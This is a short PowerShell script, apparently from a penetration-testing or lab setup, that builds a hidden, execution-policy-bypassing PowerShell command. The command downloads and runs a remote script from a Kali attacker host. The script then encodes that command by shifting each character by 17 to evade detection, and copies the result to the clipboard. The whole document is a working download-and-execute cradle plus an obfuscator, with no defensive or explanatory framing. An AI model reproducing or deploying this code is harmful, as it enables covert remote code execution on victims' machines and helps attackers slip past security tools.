$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.KALI.IP/run.txt'))"
$output = ""

$payload.ToCharArray() | ForEach-Object {
    $num = [byte][char]$_ + 17
    $output += "{0:D3}" -f $num
}

Write-Host $output
$output | clip

